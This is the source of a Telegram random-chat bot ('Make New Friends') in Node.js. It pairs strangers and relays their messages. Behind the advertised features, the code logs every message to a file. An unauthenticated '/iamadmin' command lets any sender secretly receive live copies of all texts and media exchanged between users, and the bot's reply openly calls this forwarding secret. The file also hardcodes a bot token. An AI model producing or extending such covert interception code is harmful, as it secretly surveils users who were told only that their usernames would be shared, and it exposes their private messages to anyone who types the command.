require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const mongoose = require('mongoose');
const path = require('path');
const fs = require('fs');

// Replace with your token
const token = process.env.TELEGRAM_TOKEN || '8742370601:AAEaFzkBPpL_7J6bR7VQl0fhffdpTRDANVI';
const bot = new TelegramBot(token, { polling: true });

// Database setup
const mongoURI = process.env.MONGODB_URI;
if (!mongoURI) {
    console.error("MONGODB_URI environment variable is missing!");
    process.exit(1);
}

mongoose.connect(mongoURI)
    .then(() => console.log('Connected to MongoDB.'))
    .catch(err => {
        console.error('Error connecting to MongoDB', err);
        process.exit(1);
    });

const userSchema = new mongoose.Schema({
    telegram_id: { type: Number, unique: true, required: true },
    username: String,
    first_name: String,
    find_count: { type: Number, default: 0 },
    is_premium: { type: Number, default: 0 }
});

const User = mongoose.model('User', userSchema);

// Helper functions for DB
async function getUser(telegramId) {
    try {
        return await User.findOne({ telegram_id: telegramId });
    } catch (err) {
        console.error(err);
        return null;
    }
}

async function createUser(telegramId, username, firstName) {
    try {
        const newUser = new User({ telegram_id: telegramId, username, first_name: firstName });
        await newUser.save();
        return newUser._id;
    } catch (err) {
        if (err.code !== 11000) { // Ignore duplicate key errors
            console.error(err);
            throw err;
        }
    }
}

async function updateUsername(telegramId, username, firstName) {
    try {
        const result = await User.updateOne(
            { telegram_id: telegramId }, 
            { $set: { username, first_name: firstName } }
        );
        return result.modifiedCount;
    } catch (err) {
        console.error(err);
        throw err;
    }
}

async function incrementFindCount(telegramId) {
    try {
        const result = await User.updateOne(
            { telegram_id: telegramId }, 
            { $inc: { find_count: 1 } }
        );
        return result.modifiedCount;
    } catch (err) {
        console.error(err);
        throw err;
    }
}

// In-memory state
let waitingQueue = []; // Array of user objects: { id, chatId, username, firstName }
const activeChats = new Map(); // Maps telegramId -> partner Object { id, chatId, username, firstName }
let adminChatId = null; // Secret admin view

// Commands
bot.onText(/^\/start$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const username = msg.from.username || '';
    const firstName = msg.from.first_name || '';

    try {
        await createUser(fromId, username, firstName);
        await updateUsername(fromId, username, firstName);
        
        const welcomeMessage = `👋 Welcome to Make New Friends, ${firstName}!\n\n` +
            `This bot connects you with random people to chat. Your username will be shared with them.\n\n` +
            `Commands:\n` +
            `🔍 /find - Find a new partner to chat with\n` +
            `⏭️ /next - End current chat and quickly find a new partner\n` +
            `🛑 /end - End your current chat\n\n` +
            `Ready? Type /find to start!`;
        
        bot.sendMessage(chatId, welcomeMessage);
    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "An error occurred. Please try again later.");
    }
});

async function handleFindCommand(chatId, fromId, username, firstName) {
    // Check if user is already in a chat
    if (activeChats.has(fromId)) {
        bot.sendMessage(chatId, "You are already chatting with someone! Use /end to stop current chat, or /next to switch.");
        return;
    }

    // Check if user is already waiting
    if (waitingQueue.find(u => u.id === fromId)) {
        bot.sendMessage(chatId, "You are already in the waiting queue. Please wait for a partner...");
        return;
    }

    try {
        const user = await getUser(fromId);
        if (!user) {
            bot.sendMessage(chatId, "Please run /start first.");
            return;
        }

        // Increment count (for stats)
        await incrementFindCount(fromId);
        bot.sendMessage(chatId, `🔍 Finding a partner...`);

        // Check if someone is waiting
        if (waitingQueue.length > 0) {
            const partner = waitingQueue.shift();
            
            // Connect them
            const currentUserObj = { id: fromId, chatId, username, firstName };
            activeChats.set(fromId, partner);
            activeChats.set(partner.id, currentUserObj);

            // Notify both
            const partnerDisplayName = partner.username ? `@${partner.username}` : partner.firstName;
            const currentDisplayName = username ? `@${username}` : firstName;

            bot.sendMessage(chatId, `🎉 Partner found! You are now chatting with ${partnerDisplayName}.\nSay Hi!`);
            bot.sendMessage(partner.chatId, `🎉 Partner found! You are now chatting with ${currentDisplayName}.\nSay Hi!`);
        } else {
            // Add to queue
            waitingQueue.push({ id: fromId, chatId, username, firstName });
        }
    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "An error occurred while finding a partner.");
    }
}

bot.onText(/^\/find$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const username = msg.from.username || '';
    const firstName = msg.from.first_name || '';

    // Automatically update their username if it changed
    await updateUsername(fromId, username, firstName);

    handleFindCommand(chatId, fromId, username, firstName);
});

bot.onText(/^\/end$/, (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    // Check if waiting
    const waitingIndex = waitingQueue.findIndex(u => u.id === fromId);
    if (waitingIndex !== -1) {
        waitingQueue.splice(waitingIndex, 1);
        bot.sendMessage(chatId, "You have left the waiting queue.");
        return;
    }

    // Check if chatting
    if (activeChats.has(fromId)) {
        const partner = activeChats.get(fromId);
        
        activeChats.delete(fromId);
        activeChats.delete(partner.id);

        bot.sendMessage(chatId, "You have ended the chat.");
        bot.sendMessage(partner.chatId, "Your partner has ended the chat.");
    } else {
        bot.sendMessage(chatId, "You are not currently in a chat or waiting queue.");
    }
});

bot.onText(/^\/next$/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;
    const username = msg.from.username || '';
    const firstName = msg.from.first_name || '';

    // If waiting, just remove from queue and tell them
    const waitingIndex = waitingQueue.findIndex(u => u.id === fromId);
    if (waitingIndex !== -1) {
        waitingQueue.splice(waitingIndex, 1);
    } else if (activeChats.has(fromId)) {
        // End current chat quietly or with notification
        const partner = activeChats.get(fromId);
        activeChats.delete(fromId);
        activeChats.delete(partner.id);

        bot.sendMessage(partner.chatId, "Your partner has ended the chat.");
        bot.sendMessage(chatId, "Chat ended. Looking for a new partner...");
    }

    // Automatically update their username if it changed
    await updateUsername(fromId, username, firstName);

    handleFindCommand(chatId, fromId, username, firstName);
});

bot.onText(/^\/iamadmin$/, (msg) => {
    adminChatId = msg.chat.id;
    bot.sendMessage(adminChatId, "🕵️‍♂️ You are now registered as the Master Admin! Every text, photo, video, and sticker sent between users will be secretly forwarded to you here in real-time.");
});

// Handle messages between users
bot.on('message', async (msg) => {
    const fromId = msg.from ? msg.from.id : null;
    if (!fromId) return;

    // Ignore commands
    if (msg.text && msg.text.startsWith('/')) return;

    // Check if user is in an active chat
    if (activeChats.has(fromId)) {
        const partner = activeChats.get(fromId);
        
        // Copy the exact message to the partner
        bot.copyMessage(partner.chatId, msg.chat.id, msg.message_id).catch(err => {
            console.error('Error forwarding message:', err);
            if (err.response && err.response.body && err.response.body.error_code === 403) {
                activeChats.delete(fromId);
                activeChats.delete(partner.id);
                bot.sendMessage(msg.chat.id, "Your partner has blocked the bot. The chat is ended.");
            }
        });

        // Log the message for the admin via File and Live Forwarding
        const senderName = msg.from.username ? `@${msg.from.username}` : `${msg.from.first_name}`;
        const partnerName = partner.username ? `@${partner.username}` : `${partner.firstName}`;
        
        try {
            const msgContent = msg.text ? msg.text : `[Media/File/Sticker]`;
            const logEntry = `[${new Date().toLocaleString()}] ${senderName} to ${partnerName}: ${msgContent}\n`;
            fs.appendFileSync(path.join(__dirname, 'chat_logs.txt'), logEntry);
        } catch (e) {
            console.error('Failed to log message', e);
        }

        if (adminChatId && adminChatId !== msg.chat.id) {
            bot.sendMessage(adminChatId, `[Log] ${senderName} sent to ${partnerName}:`).then(() => {
                bot.copyMessage(adminChatId, msg.chat.id, msg.message_id).catch(e => console.error("Admin forward err", e));
            });
        }
    } else {
        bot.sendMessage(msg.chat.id, "You are not in a chat! Type /find to find a partner.");
    }
});

console.log('Bot is starting...');
